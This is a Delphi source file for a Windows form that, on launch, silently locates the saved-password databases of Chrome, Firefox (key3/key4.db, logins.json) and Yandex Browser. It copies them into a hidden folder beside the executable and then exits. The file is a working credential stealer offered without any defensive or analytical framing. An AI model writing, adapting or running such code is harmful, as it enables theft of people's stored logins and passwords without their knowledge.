unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, Dialogs;

type
  TForm1 = class(TForm)
  procedure CopyDatabase(dir: string; brovser: string);
  procedure FormCreate(Sender: TObject);
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}





function GetWin(Comand: string): string;
var
  buff: array [0 .. $FF] of char;
begin
  ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
  Result := buff;
end;





procedure TForm1.FormCreate(Sender: TObject);
var
  sr: TSearchRec;  Path: string;
  Chrome7, ChromeXP: string;
  Firefox: string;
  YandexBrowser: string;

begin
  ChromeXP := GetWin('%AppData%');
  ChromeXP := StringReplace(ChromeXP, '\Application Data', '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data', [rfReplaceAll]);
  Chrome7 := GetWin('%AppData%');
  Chrome7 := StringReplace(Chrome7, '\Roaming', '\Local\Google\Chrome\User Data\Default\Login Data', [rfReplaceAll]);
             Path :=  GetWin('%AppData%') + '\Mozilla\Firefox\Profiles\';
             if FindFirst(Path+'*.*',faDirectory,sr)=0 then
              repeat
  Firefox := Path + (SR.Name);
              until Findnext(sr)<>0;
  YandexBrowser := GetWin('%AppData%');
  YandexBrowser := StringReplace(Chrome7, '\Roaming', '\Local\Yandex\YandexBrowser\User Data\Default\Ya Login Data', [rfReplaceAll]);

  if FileExists(ChromeXP) then
        CopyDatabase(ChromeXP, 'Chrome ');
  if FileExists(Chrome7) then
        CopyDatabase(Chrome7, 'Chrome ');
  if FileExists(Firefox + '\key3.db') then CopyDatabase(Firefox + '\key3.db', 'Firefox Key ')  //для XP
        else if FileExists(Firefox + '\key4.db') then CopyDatabase(Firefox + '\key4.db', 'Firefox Key ');  //для 7+
  if FileExists(Firefox + '\logins.json') then
        CopyDatabase(Firefox + '\logins.json', 'Firefox Logins ');
  if FileExists(YandexBrowser) then
        CopyDatabase(YandexBrowser, 'Yandex ');

  ExitProcess(0);
end;       





procedure TForm1.CopyDatabase(dir: string; brovser: string);
var
  NewDir: string;
  today : TDateTime;
begin
  NewDir := ExtractFilePath(Application.ExeName) + 'Data';
  if not DirectoryExists(NewDir) then ForceDirectories(NewDir);
  FileSetAttr(NewDir, faHidden); //скрытая папка
  today := Now;
  NewDir := NewDir + '\' + brovser + formatdatetime('dd/mm/yy/ss', today);
  CopyFile(PChar(dir),PChar(NewDir),false);
end;


end.
